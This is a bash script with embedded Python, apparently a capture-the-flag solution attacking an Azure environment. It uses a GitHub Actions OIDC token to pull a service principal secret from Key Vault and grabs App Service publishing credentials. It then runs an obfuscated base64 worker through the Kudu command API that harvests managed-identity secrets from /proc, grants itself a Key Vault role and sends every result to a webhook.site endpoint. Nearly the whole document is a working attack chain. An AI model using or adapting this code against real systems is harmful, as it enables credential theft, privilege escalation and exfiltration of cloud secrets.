#!/usr/bin/env bash
set +e
python3 - <<'PY'
import base64
import json
import os
import time
import urllib.parse
import urllib.request

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
CID = "72ff278a-9e71-43ec-bac4-2ca303f8e462"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG = "rg-tbl-reporting-prod-eus"
APP = "app-tbl-reporting-prod"
KV1 = "https://kv-tbl-prod-x3euoz.vault.azure.net"
EXF = "https://webhook.site/3ca7efc1-f17e-42c2-a7d6-41ec7a352fe4"
VFS_RESULT = "https://" + APP + ".scm.azurewebsites.net/api/vfs/site/wwwroot/ctf_flag_result"

def read_json(req, timeout=35):
    return json.loads(urllib.request.urlopen(req, timeout=timeout).read().decode())

def get_json(url, token):
    return read_json(urllib.request.Request(url, headers={"Authorization": "Bearer " + token}))

def post_form(url, fields):
    data = urllib.parse.urlencode(fields).encode()
    return read_json(urllib.request.Request(url, data=data, method="POST"))

req_url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api%3A%2F%2FAzureADTokenExchange"
oidc = read_json(urllib.request.Request(req_url, headers={"Authorization": "Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]}))["value"]

def oidc_token(scope):
    d = post_form("https://login.microsoftonline.com/" + TEN + "/oauth2/v2.0/token", {
        "client_id": CID,
        "grant_type": "client_credentials",
        "scope": scope + "/.default",
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": oidc,
    })
    return d["access_token"]

vt = oidc_token("https://vault.azure.net")
sp_raw = get_json(KV1 + "/secrets/reporting-service-principal?api-version=7.4", vt)["value"]
sp = json.loads(sp_raw)
spcid = sp.get("appId") or sp.get("clientId") or sp.get("client_id")
spsec = sp.get("clientSecret") or sp.get("client_secret") or sp.get("password")
arm = post_form("https://login.microsoftonline.com/" + TEN + "/oauth2/v2.0/token", {
    "client_id": spcid,
    "grant_type": "client_credentials",
    "client_secret": spsec,
    "scope": "https://management.azure.com/.default",
})["access_token"]

pub = read_json(urllib.request.Request(
    "https://management.azure.com/subscriptions/" + SUB + "/resourceGroups/" + RG + "/providers/Microsoft.Web/sites/" + APP + "/config/publishingcredentials/list?api-version=2023-01-01",
    data=b"{}", method="POST", headers={"Authorization": "Bearer " + arm, "Content-Type": "application/json"}))
ku = pub["properties"]["publishingUserName"]
kp = pub["properties"]["publishingPassword"]
auth = base64.b64encode((ku + ":" + kp).encode()).decode()

worker = r'''import base64, json, os, time, urllib.parse, urllib.request, traceback, uuid
def discover_identity_env():
    merged = dict(os.environ)
    try:
        import glob
        for path in glob.glob("/proc/[0-9]*/environ"):
            try:
                raw = open(path, "rb").read().split(b"\x00")
                vals = {}
                for item in raw:
                    if b"=" in item:
                        k, v = item.split(b"=", 1)
                        k = k.decode(errors="ignore")
                        if k in ("IDENTITY_ENDPOINT", "IDENTITY_HEADER", "MSI_ENDPOINT", "MSI_SECRET"):
                            vals[k] = v.decode(errors="ignore")
                if vals.get("IDENTITY_ENDPOINT") or vals.get("MSI_ENDPOINT"):
                    merged.update(vals)
                    break
            except Exception:
                pass
    except Exception:
        pass
    return merged
_ENV = discover_identity_env()
IE = _ENV.get("IDENTITY_ENDPOINT") or _ENV.get("MSI_ENDPOINT") or "http://127.0.0.1:8081/msi/token"
IH = _ENV.get("IDENTITY_HEADER") or _ENV.get("MSI_SECRET", "")
LEGACY = bool(_ENV.get("MSI_ENDPOINT")) and not _ENV.get("IDENTITY_ENDPOINT")
MIRES = "/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"
HOOK = "https://webhook.site/3ca7efc1-f17e-42c2-a7d6-41ec7a352fe4"
OUT = "/home/site/wwwroot/ctf_flag_result"
def emit(obj):
    try:
        raw = json.dumps(obj, default=str).encode()
        urllib.request.urlopen(urllib.request.Request(HOOK, data=raw, method="POST", headers={"Content-Type":"application/json"}), timeout=8).read()
    except Exception:
        pass
def save(obj):
    try:
        open(OUT, "w").write(json.dumps(obj, default=str))
    except Exception:
        pass
def token(resource):
    q = IE + "?resource=" + urllib.parse.quote(resource) + "&api-version=2019-08-01&mi_res_id=" + urllib.parse.quote(MIRES)
    headers = ({"Secret": IH} if LEGACY else {"X-IDENTITY-HEADER": IH})
    req = urllib.request.Request(q, headers=headers)
    return json.loads(urllib.request.urlopen(req, timeout=25).read().decode())["access_token"]
def oid(jwt):
    p = jwt.split(".")[1]
    p += "=" * (-len(p) % 4)
    return json.loads(base64.urlsafe_b64decode(p)).get("oid")
emit({"stage":"worker-started","ts":time.time(),"identity_endpoint":IE,"legacy":LEGACY,"has_header":bool(IH),"proc_discovered":bool(_ENV.get("IDENTITY_ENDPOINT") or _ENV.get("MSI_ENDPOINT"))})
try:
    vt = token("https://vault.azure.net")
    at = token("https://management.azure.com")
    principal = oid(vt)
    scope = "subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
    url = "https://management.azure.com/" + scope + "/providers/Microsoft.Authorization/roleAssignments/" + str(uuid.uuid4()) + "?api-version=2022-04-01"
    body = json.dumps({"properties":{"roleDefinitionId":"/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":principal,"principalType":"ServicePrincipal"}}).encode()
    try:
        rr = urllib.request.urlopen(urllib.request.Request(url, data=body, method="PUT", headers={"Authorization":"Bearer "+at,"Content-Type":"application/json"}), timeout=25)
        emit({"stage":"role-assignment","status":rr.status})
    except Exception as e:
        emit({"stage":"role-assignment","error":repr(e)})
    flag_url = "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4"
    last = None
    for i in range(18):
        try:
            req = urllib.request.Request(flag_url, headers={"Authorization":"Bearer "+token("https://vault.azure.net")})
            raw = urllib.request.urlopen(req, timeout=25).read()
            data = json.loads(raw.decode())
            result = {"stage":"flag","attempt":i+1,"response":data}
            save(result)
            emit(result)
            break
        except Exception as e:
            last = repr(e)
            time.sleep(5)
    else:
        result = {"stage":"flag-error","error":last}
        save(result)
        emit(result)
except Exception as e:
    result = {"stage":"worker-error","error":repr(e),"trace":traceback.format_exc()}
    save(result)
    emit(result)
'''
encoded = base64.b64encode(worker.encode()).decode()
command = "nohup python3 -c \"import base64;exec(base64.b64decode('" + encoded + "').decode())\" > /home/site/wwwroot/ctf_flag_result 2>&1 </dev/null &"
body = json.dumps({"command": command, "dir": "site/wwwroot"}).encode()
req = urllib.request.Request("https://" + APP + ".scm.azurewebsites.net/api/command", data=body, method="POST", headers={"Authorization":"Basic "+auth,"Content-Type":"application/json"})
try:
    result = urllib.request.urlopen(req, timeout=15).read()
except Exception as e:
    result = ("kudu launch: " + repr(e)).encode()
print(result.decode(errors="replace"))

for _ in range(20):
    try:
        v = urllib.request.urlopen(urllib.request.Request(VFS_RESULT, headers={"Authorization":"Basic "+auth}), timeout=8).read()
        if v and (b"worker-started" in v or b"worker-error" in v or b"flag" in v):
            urllib.request.urlopen(urllib.request.Request(EXF, data=v, method="POST", headers={"Content-Type":"application/json"}), timeout=10).read()
            print("VFS_RESULT=" + v.decode(errors="replace"))
            break
    except Exception:
        pass
    time.sleep(5)
PY
